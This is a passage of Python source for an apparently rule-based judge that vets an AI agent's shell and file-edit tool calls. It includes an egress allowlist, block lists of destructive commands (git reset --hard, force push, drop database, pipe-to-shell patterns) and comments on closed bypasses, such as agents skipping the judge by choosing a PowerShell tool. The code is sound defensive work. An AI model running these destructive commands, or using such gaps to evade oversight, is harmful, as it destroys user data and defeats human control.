                ),
            ),
        ]

    blocked = [d for d in destinations if not _host_matches_allowlist(d, allowlist)]
    if not blocked:
        return []

    blocked_unique = sorted(set(blocked))
    return [
        RuleVerdict(
            "EGRESS_BLOCKED_DESTINATION",
            "critical",
            f"Network destination(s) not on security.egress_allowlist: {', '.join(blocked_unique)}",
            evidence=command[:200],
            recommendation=(
                "Default allowlist is empty — every network egress is "
                "refused unless explicitly allowed. Add the destination "
                "to security.egress_allowlist (dashboard) if the egress "
                "is intentional. This is a structural allowlist; it does "
                "NOT depend on detecting bad shapes, so obfuscation of "
                "the destination still fails closed (the obfuscated form "
                "isn't on the allowlist either)."
            ),
        ),
    ]


# ── Built-in destructive patterns (absorbed from access_gate) ──
_BUILTIN_DANGEROUS: list[dict[str, str]] = [
    # Git destructive
    {
        "command": "git",
        "args": "reset --hard",
        "risk": "high",
        "reason": "Discards uncommitted work.",
    },
    {
        "command": "git",
        "args": "reset --mixed",
        "risk": "high",
        "reason": "Unstages changes, can lose work.",
    },
    {
        "command": "git",
        "args": "checkout HEAD",
        "risk": "high",
        "reason": "Overwrites working tree files.",
    },
    {
        "command": "git",
        "args": "checkout .",
        "risk": "high",
        "reason": "Discards all local changes.",
    },
    {
        "command": "git",
        "args": "switch",
        "risk": "medium",
        "reason": "Branch switching is a user decision.",
    },
    {"command": "git", "args": "restore .", "risk": "high", "reason": "Discards all changes."},
    {
        "command": "git",
        "args": "restore --staged --worktree",
        "risk": "high",
        "reason": "Discards staged and unstaged changes.",
    },
    {
        "command": "git",
        "args": "clean -f",
        "risk": "high",
        "reason": "Permanently deletes untracked files.",
    },
    {
        "command": "git",
        "args": "clean -fd",
        "risk": "high",
        "reason": "Permanently deletes untracked files and directories.",
    },
    {
        "command": "git",
        "args": "clean -x",
        "risk": "high",
        "reason": "Permanently deletes ignored and untracked files.",
    },
    {
        "command": "git",
        "args": "push --force",
        "risk": "high",
        "reason": "Overwrites remote history.",
    },
    {"command": "git", "args": "push -f ", "risk": "high", "reason": "Overwrites remote history."},
    {"command": "git", "args": "branch -D", "risk": "medium", "reason": "Force-deletes a branch."},
    {
        "command": "git",
        "args": "stash drop",
        "risk": "medium",
        "reason": "Permanently loses stashed work.",
    },
    {
        "command": "git",
        "args": "stash clear",
        "risk": "high",
        "reason": "Permanently loses all stashed work.",
    },
    {"command": "git", "args": "rebase -i", "risk": "medium", "reason": "Rewrites commit history."},
    {
        "command": "git",
        "args": "rebase --interactive",
        "risk": "medium",
        "reason": "Rewrites commit history.",
    },
    {
        "command": "git",
        "args": "reflog expire",
        "risk": "critical",
        "reason": "Permanently destroys reflog recovery points.",
    },
    # Package manager destructive
    {
        "command": "npm",
        "args": "cache clean --force",
        "risk": "medium",
        "reason": "Nukes npm cache.",
    },
    {
        "command": "pip",
        "args": "uninstall",
        "risk": "medium",
        "reason": "Removes installed packages.",
    },
    {
        "command": "cargo",
        "args": "clean",
        "risk": "low",
        "reason": "Deletes compiled build artifacts.",
    },
    {"command": "dotnet", "args": "clean", "risk": "low", "reason": "Deletes build output."},
    # Docker destructive
    {
        "command": "docker",
        "args": "rm -f",
        "risk": "high",
        "reason": "Force-kills and removes containers.",
    },
    {"command": "docker", "args": "rmi -f", "risk": "high", "reason": "Force-removes images."},
    {
        "command": "docker",
        "args": "system prune",
        "risk": "high",
        "reason": "Deletes all unused containers/images/networks.",
    },
    {
        "command": "docker",
        "args": "volume rm",
        "risk": "high",
        "reason": "Permanently deletes volume data.",
    },
    # Database destructive
    {
        "command": "*",
        "args": "drop database",
        "risk": "critical",
        "reason": "Permanently destroys database.",
    },
    {
        "command": "*",
        "args": "drop table",
        "risk": "critical",
        "reason": "Permanently destroys table.",
    },
    {
        "command": "*",
        "args": "truncate table",
        "risk": "high",
        "reason": "Permanently deletes all table data.",
    },
    # Process termination
    {"command": "kill", "args": "-9", "risk": "high", "reason": "Force-terminates a process."},
    {"command": "killall", "args": "", "risk": "high", "reason": "Terminates processes by name."},
    {"command": "taskkill", "args": "", "risk": "high", "reason": "Terminates Windows processes."},
    # Remote code execution
    {"pattern": "| bash", "risk": "critical", "reason": "Pipes remote content to shell."},
    {"pattern": "| sh", "risk": "critical", "reason": "Pipes remote content to shell."},
    {
        "pattern": "| powershell",
        "risk": "critical",
        "reason": "Pipes remote content to PowerShell.",
    },
    {"pattern": "| pwsh", "risk": "critical", "reason": "Pipes remote content to PowerShell."},
]


# ── Config-driven rules loading ──

_config_cache: dict[str, tuple[float, list[dict[str, str]]]] = {}


def _load_config_dangerous(project_root: Path) -> list[dict[str, str]]:
    """Load dangerous policies from SQLite config store (policies.dangerous key)."""
    try:
        from .config_store import ConfigStore

        raw = ConfigStore().get_effective(project_root, "policies.dangerous", default=None)
        if not isinstance(raw, list):
            return []

        result: list[dict[str, str]] = []
        for entry in raw:
            if not isinstance(entry, dict):
                continue
            risk = str(entry.get("risk", "high")).strip().lower()
            reason = str(entry.get("reason", "")).strip()
            if not reason:
                continue
            result.append(
                {
                    "command": str(entry.get("command", "*")).strip().lower(),
                    "args": str(entry.get("args", "")).strip().lower() if entry.get("args") else "",
                    "pattern": str(entry.get("pattern", "")).strip().lower()
                    if entry.get("pattern")
                    else "",
                    "risk": risk,
                    "reason": reason,
                },
            )
        return result
    except Exception:
        return []


def get_dangerous_rules(project_root: Path | None = None) -> list[dict[str, str]]:
    """Get merged built-in + config dangerous rules. Cached per-process."""
    if project_root is None:
        return _BUILTIN_DANGEROUS

    cache_key = str(project_root)
    cached = _config_cache.get(cache_key)
    if cached:
        return cached[1]

    config_rules = _load_config_dangerous(project_root)
    merged = _BUILTIN_DANGEROUS + config_rules
    _config_cache[cache_key] = (0.0, merged)
    return merged


_DANGEROUS_SEGMENT_SPLIT_RE = re.compile(r"[;|&\n\r()]+")
# Control-structure keywords occupy the head of a statement without being the
# command. `do rm -rf x` is an `rm`. Same reasoning as
# bash_policy.normalize_command_segments, kept local so the judge does not
# import the policy evaluator.
_DANGEROUS_LEAD_KEYWORDS: frozenset[str] = frozenset(
    {"do", "then", "else", "elif", "if", "while", "until", "time", "!", "{", "}", "done", "fi",
     "esac"},
)
# Wrappers that RUN another command. Peeling these is ADDITIVE only: the
# wrapper itself is still offered as a command position first, so a rule that
# targets `sudo` or `xargs` keeps matching, AND a rule that targets the wrapped
# command (`sudo rm -rf /`) now matches too.
_DANGEROUS_WRAPPERS: frozenset[str] = frozenset(
    {"sudo", "doas", "command", "nohup", "exec", "eval", "xargs", "env", "stdbuf", "nice"},
)
_ENV_ASSIGN_RE = re.compile(r"^[a-z_][a-z0-9_]*=")


def _dangerous_command_positions(segment: str) -> list[tuple[str, list[str]]]:
    """Every (base command, argument tokens) this segment could be running."""
    toks = segment.split()
    while toks and (_ENV_ASSIGN_RE.match(toks[0]) or toks[0] in _DANGEROUS_LEAD_KEYWORDS):
        toks = toks[1:]
    out: list[tuple[str, list[str]]] = []
    for _ in range(6):  # bounded wrapper chain (`sudo nohup xargs …`)
        if not toks:
            break
        base = toks[0].strip("\"'").replace("\\", "/").rsplit("/", 1)[-1]
        if base.endswith(".exe"):
            base = base[:-4]
        out.append((base, toks[1:]))
        if base not in _DANGEROUS_WRAPPERS:
            break
        toks = [t for t in toks[1:] if not t.startswith("-")]
    return out


def _dangerous_rule_hit(cmd_lower: str, cmd_match: str, args_match: str) -> bool:
    """True when `cmd_match` runs in COMMAND POSITION with `args_match` among
    its argument TOKENS.

    Replaces two bare `in` substring tests. A subcommand is a token, not a run
    of letters: an operator rule for `git switch` must not fire on a path
    argument that merely contains the word (measured: `git add
    .../test_kill_switch_outside_freeze.py`), while `git switch main`,
    `…; git switch other` and a heredoc line `git reset --hard` must all still
    fire. A multi-word `args` (`system prune`, `reset --hard`) must appear as a
    CONTIGUOUS run of whole argument tokens.
    """
    if " " in cmd_match.strip():
        # Not a single binary name — no command position to speak of; keep the
        # legacy containment behaviour rather than silently stop matching.
        return cmd_match in cmd_lower and (not args_match or args_match in cmd_lower)
    want = args_match.split()
    for segment in _DANGEROUS_SEGMENT_SPLIT_RE.split(cmd_lower):
        for base, args in _dangerous_command_positions(segment):
            if not base or base != cmd_match:
                continue
            if not want:
                return True
            for i in range(len(args) - len(want) + 1):
                if args[i : i + len(want)] == want:
                    return True
    return False


def _check_dangerous_rules(
    command: str,
    project_root: Path | None = None,
    *,
    provider: str = "bash",
    transport: str = "ai_run",
) -> list[RuleVerdict]:
    """Check command against built-in + config-driven dangerous patterns.

    #490 FP fix (specimen 2026-07-19, narrow — no rule removed): these
    rules are bare substring matches over the whole command string, so a
    `git commit -m "...kill_switch..."` message satisfied the
    {command: "git", args: "switch"} rule and two honest commits were
    refused (judge_confirmable_no_intent). A quoted `-m/--message`
    payload is DATA the shell hands to git verbatim — it is never
    executed — so it is blanked before matching, exactly as the
    shell-shape rules already do via _strip_prose_windows.

    Deliberately NOT stripped here: heredoc bodies and `echo` payloads.
    A heredoc body can be piped into a shell (`bash <<EOF ... EOF`), so
    it is executable text and must stay visible to these rules.
    """
    verdicts: list[RuleVerdict] = []
    cmd_lower = (
        _strip_prose_windows(
            command,
            strip_heredoc=False,
            strip_git_commit_m=True,
            strip_echo_quoted=False,
        )
        .strip()
        .lower()
    )
    rules = get_dangerous_rules(project_root)

    for rule in rules:
        pattern = rule.get("pattern", "")
        cmd_match = rule.get("command", "*")
        args_match = rule.get("args", "")
        risk = rule.get("risk", "high")
        reason = rule.get("reason", "Dangerous command blocked.")

        # Pattern-based: just check if pattern appears anywhere in command
        if pattern:
            if pattern in cmd_lower:
                verdicts.append(
                    RuleVerdict(
                        rule_id=f"CFG_{pattern.replace(' ', '_').upper()[:30]}",
                        risk=risk,
                        description=reason,
                        evidence=command[:200],
                        recommendation="Ask the user to run this directly if needed.",
                    ),
                )
            continue

        # Command+args based: check if command is present AND args fragment is present
        if cmd_match == "*":
            # Wildcard command — just check args
            if args_match and args_match in cmd_lower:
                verdicts.append(
                    RuleVerdict(
                        rule_id=f"CFG_{args_match.replace(' ', '_').upper()[:30]}",
                        risk=risk,
                        description=reason,
                        evidence=command[:200],
                        recommendation="Ask the user to run this directly if needed.",
                    ),
                )
        # Specific command — the COMMAND must appear in command position and
        # its args fragment must appear in that segment's ARGUMENTS.
        #
        # #583 FP fix (specimen measured 2026-07-27, narrow — no rule removed):
        # this branch was `cmd_match in cmd_lower and args_match in cmd_lower`,
        # two bare substring tests over the whole command string. Measured
        # consequence for the operator rule {command: "git", args: "switch"}:
        #
        #     git add mcp/tests/security/test_kill_switch_outside_freeze.py
        #       -> CFG_GIT_SWITCH -> judge_confirmable_no_intent
        #
        # The letters "switch" inside a FILENAME are not a git subcommand, so
        # that test file could not be staged at all. #490 had already blanked
        # quoted `-m/--message` payloads, which fixed the commit-message
        # variants (re-measured: they no longer fire) but not a path argument,
        # nor a rule whose own identifier contains the token.
        #
        # `_dangerous_rule_hit` requires the command in COMMAND POSITION of a
        # segment and the args fragment among that same segment's argument
        # TOKENS. `git switch main`, `git commit -m x; git switch other` and a
        # heredoc body carrying `git reset --hard` all still fire — pinned by
        # tests/security/test_war_u_fp_corpus.py. Pattern-style rules
        # (`{"pattern": "| bash"}`) are untouched: a pattern is explicitly a
        # whole-command shape, not a subcommand.
        elif _dangerous_rule_hit(cmd_lower, cmd_match, args_match):
            verdicts.append(
                RuleVerdict(
                    rule_id=f"CFG_{cmd_match.upper()}_{args_match.replace(' ', '_').upper()[:20]}",
                    risk=risk,
                    description=reason,
                    evidence=command[:200],
                    recommendation="Ask the user to run this directly if needed.",
                ),
            )

    return verdicts


def clear_cache(project_root: Path | None = None) -> None:
    """Clear config cache."""
    if project_root:
        _config_cache.pop(str(project_root), None)
    else:
        _config_cache.clear()


# ── Public API ──


def evaluate_tool_call(
    tool_name: str,
    tool_input: dict[str, object] | None = None,
    *,
    project_root: Path | None = None,
) -> JudgeResult:
    """Evaluate a tool call against all heuristic rules + config-driven dangerous patterns.

    Returns a JudgeResult with all applicable verdicts.
    Sub-millisecond latency — no I/O (config cached), no LLM calls.
    """
    name = tool_name.strip().lower()
    for prefix in ("mcp__aidocs__", "mcp__playwright__"):
        name = name.removeprefix(prefix)

    # AIDOCS shell provider lock — Batch B (canonical 2026-04-29).
    # Derive provider/transport from the host-supplied tool_name.
    #   provider="bash" — current judge dialect (only one implemented).
    #   provider="powershell" — reserved for Batch C; today the bash
    #     judge still runs against the command text per the universal
    #     cascade (test_judge_powershell_routing pins this), so the
    #     dispatch behavior is unchanged. Tagging provider lets audit
    #     attribute verdicts correctly when Batch C ships a real
    #     PowerShell judge.
    #   transport="ai_run" — AIDOCS-owned spawn pipeline (post-Batch-B
    #     this is the only legitimate path for shell execution).
    #   transport="host_native" — raw host tool name (T0-blocked on
    #     managed projects per Invariant #38, but the judge still
    #     evaluates in case the gate cascade ever lets it through).
    #   transport="unknown" — non-shell tool (File edits, etc.) where
    #     the concept doesn't apply.
    _PROVIDER_FROM_TOOL: dict[str, str] = {
        "bash": "bash",
        "ai_run": "bash",
        "monitor": "bash",
        "shell": "bash",
        "wsl": "bash",
        "powershell": "powershell",
        "pwsh": "powershell",
        "cmd": "bash",  # If cmd ever reaches judge (shouldn't post
        # Batch B), grade as bash — defense in depth
        # since cmd-shape commands are rejected at the
        # resolver before dispatch.
    }
    _TRANSPORT_FROM_TOOL: dict[str, str] = {
        "bash": "host_native",
        "powershell": "host_native",
        "pwsh": "host_native",
        "shell": "host_native",
        "cmd": "host_native",
        "wsl": "host_native",
        "ai_run": "ai_run",
        "monitor": "ai_run",
    }
    _provider = _PROVIDER_FROM_TOOL.get(name, "bash")
    _transport = _TRANSPORT_FROM_TOOL.get(name, "unknown")

    result = JudgeResult(
        tool_name=name,
        provider=_provider,
        transport=_transport,
    )
    args = tool_input or {}

    # Shell-equivalent commands — every tool surface that runs a
    # `command` argument as a shell goes through the same rule cascade.
    # Without this, hosts that expose a separate PowerShell / pwsh /
    # Monitor / etc. tool would let agents bypass the entire judge by
    # picking a non-`bash` shell tool. Confirmed gap 2026-04-26: the
    # PowerShell tool surface ran end-to-end with zero judge fire,
    # bypassing the full #46 audit (92 rule_ids worth of coverage).
    #
    # Tool name list is intentionally generous — any new shell-shape
    # tool the host adds should match here unless the agent has a
    # legitimate reason to bypass shell rules (none today).
    #
    # `monitor` is included because it runs an arbitrary `command`
    # whose stdout is streamed as events; same shell power as bash.
    _SHELL_EQUIVALENT_TOOL_NAMES = (
        "bash",
        "ai_run",
        "powershell",
        "pwsh",
        "shell",
        "cmd",
        "wsl",
        "monitor",
    )
    if name in _SHELL_EQUIVALENT_TOOL_NAMES:
        command = str(args.get("command", ""))
        if command:
            result.verdicts.extend(
                _check_bash_rules(
                    command,
                    project_root,
                    provider=_provider,
                    transport=_transport,
                ),
            )
            result.verdicts.extend(
                _check_git_rules(
                    command,
                    provider=_provider,
                    transport=_transport,
                ),
            )
            result.verdicts.extend(
                _check_network_rules(
                    command,
                    provider=_provider,
                    transport=_transport,
                ),
            )
            result.verdicts.extend(
                _check_dangerous_rules(
                    command,
                    project_root,
                    provider=_provider,
                    transport=_transport,
                ),
            )

            result.verdicts.extend(
                _check_egress_allowlist(
                    command,
                    project_root,
                    provider=_provider,
                    transport=_transport,
                ),
            )

    # File write operations
    if name in (
        "edit",
        "write",
        "ai_edit_lines",
        "ai_batch_edit",
        "ai_replace",
        "ai_str_replace",
        "ai_anchor_replace",
        "ai_insert_lines",
        "ai_create_file",
    ):
        from .access_gate import PathInputConflict, _extract_path

        try:
            path = _extract_path(args)
        except PathInputConflict as conflict:
            # Conflicting path inputs — emit a critical verdict so the
            # judge blocks. This path is reached by callers that
            # invoke the judge directly (outside check_tool's entry
            # refusal). co-conductor 2026-04-30.
            result.verdicts.append(
                RuleVerdict(
                    rule_id="PATH_INPUT_CONFLICT",
                    risk="critical",
                    description=("Tool args contain conflicting path-shaped keys"),
                    evidence=str(conflict),
                    recommendation=("Send exactly one path-shaped key per call."),
                ),
            )
            path = ""
        # 2026-05-17 gap-2 fix: the lookup used to know only
        # new_content/content/new_str, missing the actual arg names
        # for the most-used ai_replace modes:
        #   mode='string'  -> new_string
        #   mode='anchor'  -> replacement
        #   mode='symbol'  -> new_body
        # For those modes the content-pattern rules (provider tokens,
        # PEM keys, hardcoded-secret regex, dynamic-exec) ran against
        # "" and produced nothing -- content judging was silently off
        # for >80% of real edits. Fallback chain now covers them all.
        content = str(
            args.get("new_content")
            or args.get("content")
            or args.get("new_str")
            or args.get("new_string")
            or args.get("replacement")
            or args.get("new_body")
            or "",
        )
        if path:
            result.verdicts.extend(_check_file_write_rules(path, content or None))

    # Batch edits -- check each edit's path (ai_batch_str_replace folded into
    # ai_batch_edit(mode="string")).
    if name == "ai_batch_edit":
        edits = args.get("edits", [])
        if isinstance(edits, list):
            for edit in edits[:20]:
                if isinstance(edit, dict):
                    path = str(edit.get("path", ""))
                    # Same fallback chain as the single-edit branch.
                    content = str(
                        edit.get("new_content")
                        or edit.get("content")
                        or edit.get("new_str")
                        or edit.get("new_string")
                        or edit.get("replacement")
                        or edit.get("new_body")
                        or "",
                    )
                    if path:
                        result.verdicts.extend(_check_file_write_rules(path, content or None))

    # ── #448 Consumer A: semantic enrichment seam (ADD-ONLY, fail-quiet) ──
    # Enrichment may only APPEND verdicts (an extra refusal ground or a
    # richer message citing the semantic class of touched files). It never
    # mutates or removes the cascade's verdicts — every refusal above fires
    # with enrichment on AND off — and any enrichment failure degrades to
    # the un-enriched result. Owned-store/pure-string only; the LSP guest
    # never runs on this path (§XXXII — no verdict may DEPEND on the guest).
    try:
        from .semantic_enrichment import judge_semantic_verdicts

        for _sv in judge_semantic_verdicts(
            name,
            args,
            project_root,
            existing_count=len(result.verdicts),
        ):
            result.verdicts.append(
                RuleVerdict(
                    rule_id=str(_sv.get("rule_id") or ""),
                    risk=str(_sv.get("risk") or "low"),
                    description=str(_sv.get("description") or ""),
                    evidence=str(_sv.get("evidence") or ""),
                    recommendation=str(_sv.get("recommendation") or ""),
                ),
            )
    except Exception:
        pass

    # Deduplicate verdicts by rule_id
    seen: set[str] = set()
    unique: list[RuleVerdict] = []
    for v in result.verdicts:
        if v.rule_id not in seen:
            seen.add(v.rule_id)
            unique.append(v)
    result.verdicts = unique

    return result


# ═════════════════════════════════════════════════════════════════════
# Judge-rule registry (backlog #19) — enumeration + family + lock data
# ═════════════════════════════════════════════════════════════════════
#
# `list_judge_rules()` is the data contract any operator surface
# (dashboard, TOML tooling) uses to render per-family opt-out lists.
# Rules are enumerated STATICALLY from this module's source (AST scan
# of the checker functions) plus the dynamic registries
# (_PROVIDER_CREDENTIAL_PATTERNS, destructive_taxonomy catastrophic
# set, config-driven dangerous rules). The scan keys off the checker
# function a RuleVerdict literal lives in, so newly added rules pick
# up their family automatically — no parallel hand-maintained table
# to drift.

JUDGE_FAMILIES: tuple[str, ...] = (
    "bash",
    "git",
    "file_write",
    "network",
    "dangerous",
    "credential",
    "general",
)

_FAMILY_CHECKER_FUNCTIONS: dict[str, str] = {
    "_check_bash_rules": "bash",
    # _check_bash_rules family helpers (#413 decomposition) — each carries
    # a slice of the original cascade's RuleVerdict literals; the AST scan
    # is name-keyed, so every extracted helper must be registered here.
    "_bash_rm_and_pipe_rules": "bash",
    "_bash_shell_write_rules": "bash",
    "_bash_obfuscation_exfil_rules": "bash",
    "_bash_privilege_rules": "bash",
    "_bash_container_escape_rules": "bash",
    "_bash_fs_write_upload_rules": "bash",
    "_bash_platform_destructive_rules": "bash",
    "_bash_protected_path_indirection_rules": "bash",
    "_bash_dos_service_rules": "bash",
    "_bash_inline_runtime_rules": "bash",
    "_inline_code_rules": "bash",
    "_inline_protected_path_rules": "bash",
    "_check_git_rules": "git",
    "_check_file_write_rules": "file_write",
    "_check_network_rules": "network",
    "_check_dangerous_rules": "dangerous",
    "evaluate_tool_call": "general",
}

# rm-family taxonomy verdicts surfaced through _check_bash_rules via
# classify_rm_target (dynamic rule_id — invisible to the AST scan).
_TAXONOMY_RM_RULES: tuple[tuple[str, str, str], ...] = (
    ("BASH_RM_RF_ROOT", "critical", "Recursive rm targeting filesystem root."),
    ("BASH_RM_RF_WILDCARD", "critical", "Recursive rm with wildcard target."),
    ("BASH_RM_RF_ABSPATH", "high", "Recursive rm on an absolute non-tmp path."),
)


def _locked_judge_rule_ids() -> frozenset[str]:
    """Rules that can NEVER be opted out (backlog #19 'locked' set).

    - credential-exfil file-write patterns (_PROVIDER_CREDENTIAL_PATTERNS)
    - download-then-execute / dangerous-chain judge equivalents
    - catastrophic destructive taxonomy (fork bomb, device write, rm -rf /)
    - PEM private-key material writes
    """
    locked: set[str] = {rule_id for rule_id, _label, _rx in _PROVIDER_CREDENTIAL_PATTERNS}
    locked.update(
        {
            "BASH_PIPE_TO_SHELL",
            "BASH_PROCESS_SUB_EXEC",
            "BASH_EVAL_SUBSHELL",
            "FILE_PEM_PRIVATE_KEY",
        },
    )
    try:
        from .destructive_taxonomy import _CATASTROPHIC_PATTERNS

        locked.update(rule_id for _family, rule_id, _rx, _reason in _CATASTROPHIC_PATTERNS)
    except Exception:
        pass
    locked.update(rule_id for rule_id, risk, _d in _TAXONOMY_RM_RULES if risk == "critical")
    return frozenset(locked)


LOCKED_JUDGE_RULE_IDS: frozenset[str] = _locked_judge_rule_ids()

_JUDGE_RULE_REGISTRY_CACHE: list[dict[str, object]] | None = None


def _dangerous_rule_id(rule: dict[str, str]) -> str | None:
    """Mirror _check_dangerous_rules' rule_id derivation exactly."""
    pattern = rule.get("pattern", "")
    cmd_match = rule.get("command", "*")
    args_match = rule.get("args", "")
    if pattern:
        return f"CFG_{pattern.replace(' ', '_').upper()[:30]}"
    if cmd_match == "*":
        if not args_match:
            return None
        return f"CFG_{args_match.replace(' ', '_').upper()[:30]}"
    return f"CFG_{cmd_match.upper()}_{args_match.replace(' ', '_').upper()[:20]}"


def _const_str(node: object) -> str | None:
    """Best-effort constant-string extraction from an AST node.

    Handles plain constants, implicit adjacent-literal merges (already
    one Constant), `+` concatenations of constants, and conditional
    expressions with a constant body.
    """
    import ast

    if isinstance(node, ast.Constant) and isinstance(node.value, str):
        return node.value
    if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
        left = _const_str(node.left)
        right = _const_str(node.right)
        if left is not None and right is not None:
            return left + right
    if isinstance(node, ast.IfExp):
        return _const_str(node.body)
    return None


def _scan_static_rules() -> list[dict[str, object]]:
    """AST-scan this module for RuleVerdict literals inside the family
    checker functions. Returns [{rule_id, family, description, risk}]."""
    import ast
    from pathlib import Path as _P

    out: list[dict[str, object]] = []
    try:
        source = _P(__file__).read_text(encoding="utf-8")
        tree = ast.parse(source)
    except Exception:
        return out
    for fn in ast.walk(tree):
        if not isinstance(fn, ast.FunctionDef):
            continue
        family = _FAMILY_CHECKER_FUNCTIONS.get(fn.name)
        if family is None:
            continue
        for call in ast.walk(fn):
            if not isinstance(call, ast.Call):
                continue
            func = call.func
            if not (isinstance(func, ast.Name) and func.id == "RuleVerdict"):
                continue
            args: list[object | None] = [None, None, None]  # rule_id, risk, description
            for i, arg in enumerate(call.args[:3]):
                args[i] = _const_str(arg)
            for kw in call.keywords:
                if kw.arg == "rule_id":
                    args[0] = _const_str(kw.value)
                elif kw.arg == "risk":
                    args[1] = _const_str(kw.value)
                elif kw.arg == "description":
                    args[2] = _const_str(kw.value)
            rule_id = args[0]
            if not rule_id:
                continue  # dynamic rule id — covered by a registry below
            out.append(
                {
                    "rule_id": rule_id,
                    "family": family,
                    "risk": args[1] or "",
                    "description": args[2] or "",
                },
            )
    return out


def list_judge_rules(project_root: Path | None = None) -> list[dict[str, object]]:
    """Enumerate every known judge rule (backlog #19 data contract).

    Returns ``[{rule_id, family, description, risk, locked}, ...]``
    sorted by (family, rule_id). Static rules are cached per-process;
    config-driven dangerous rules are appended per call when a
    project_root is supplied (they are project-specific).
    """
    global _JUDGE_RULE_REGISTRY_CACHE
    if _JUDGE_RULE_REGISTRY_CACHE is None:
        rules: dict[str, dict[str, object]] = {}

        def _add(rule_id: str, family: str, risk: str, description: str) -> None:
            if rule_id not in rules:
                rules[rule_id] = {
                    "rule_id": rule_id,
                    "family": family,
                    "risk": risk,
                    "description": description,
                }

        for entry in _scan_static_rules():
            _add(
                str(entry["rule_id"]),
                str(entry["family"]),
                str(entry["risk"]),
                str(entry["description"]),
            )
        # Credential subfamily (dynamic ids inside _check_file_write_rules).
        for rule_id, label, _rx in _PROVIDER_CREDENTIAL_PATTERNS:
            rules.pop(rule_id, None)  # credential beats any static shadow
            _add(rule_id, "credential", "critical", f"Credential material in file write: {label}.")
        # Destructive taxonomy (dynamic ids via classify_rm_target +
        # catastrophic pattern table).
        for rule_id, risk, description in _TAXONOMY_RM_RULES:
            _add(rule_id, "bash", risk, description)
        try:
            from .destructive_taxonomy import _CATASTROPHIC_PATTERNS

            for _family, rule_id, _rx, reason in _CATASTROPHIC_PATTERNS:
                _add(rule_id, "bash", "critical", reason)
        except Exception:
            pass
        # Built-in dangerous patterns (dynamic CFG_* ids) — same
        # derivation as the per-project branch below, but these are
        # process-wide so they belong in the cache.
        for rule in get_dangerous_rules(None):
            rule_id = _dangerous_rule_id(rule)
            if rule_id:
                _add(
                    rule_id,
                    "dangerous",
                    str(rule.get("risk", "high")),
                    str(rule.get("reason", "Dangerous command blocked.")),
                )
        _JUDGE_RULE_REGISTRY_CACHE = sorted(
            rules.values(),
            key=lambda r: (str(r["family"]), str(r["rule_id"])),
        )

    result = [dict(r) for r in _JUDGE_RULE_REGISTRY_CACHE]
    if project_root is not None:
        # Config-driven dangerous rules (CFG_*) — mirror the rule_id
        # derivation in _check_dangerous_rules exactly.
        seen = {str(r["rule_id"]) for r in result}
        for rule in get_dangerous_rules(project_root):
            rule_id = _dangerous_rule_id(rule)
            if not rule_id or rule_id in seen:
                continue
            seen.add(rule_id)
            result.append(
                {
                    "rule_id": rule_id,
                    "family": "dangerous",
                    "risk": rule.get("risk", "high"),
                    "description": rule.get("reason", "Dangerous command blocked."),
                },
            )
    for entry in result:
        entry["locked"] = entry["rule_id"] in LOCKED_JUDGE_RULE_IDS
    return result

